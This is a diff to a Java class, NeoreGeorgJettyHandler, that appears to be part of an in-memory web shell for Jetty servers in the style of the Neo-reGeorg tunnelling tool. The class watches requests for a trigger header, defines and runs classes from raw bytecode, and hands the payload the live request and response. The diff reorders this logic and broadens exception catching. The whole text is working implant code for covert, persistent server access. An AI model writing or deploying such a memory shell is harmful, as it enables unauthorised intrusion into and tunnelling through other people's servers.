@@ -29,12 +29,6 @@ public class NeoreGeorgJettyHandler extends ClassLoader {
         super(z);
     }
 
-    @SuppressWarnings("all")
-    public Class<?> load(byte[] cb) {
-        return super.defineClass(cb, 0, cb.length);
-    }
-
-
     @Override
     public boolean equals(Object obj) {
         Object[] args = ((Object[]) obj);
@@ -60,9 +54,6 @@ public class NeoreGeorgJettyHandler extends ClassLoader {
         try {
             String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
             if (value != null && value.contains(headerValue)) {
-                if (baseRequest != null) {
-                    baseRequest.getClass().getMethod("setHandled", boolean.class).invoke(baseRequest, true);
-                }
                 Object[] map = new Object[]{
                         request,
                         response,
@@ -84,12 +75,20 @@ public class NeoreGeorgJettyHandler extends ClassLoader {
                     namespace.put(chars, clazz.newInstance());
                 }
                 namespace.get(chars).equals(map);
+                if (baseRequest != null) {
+                    baseRequest.getClass().getMethod("setHandled", boolean.class).invoke(baseRequest, true);
+                }
                 return true;
             }
-        } catch (Exception e) {
+        } catch (Throwable e) {
             e.printStackTrace();
         }
         return false;
+    }
+
+    @SuppressWarnings("all")
+    public Class<?> load(byte[] cb) {
+        return super.defineClass(cb, 0, cb.length);
     }
 
     @SuppressWarnings("all")
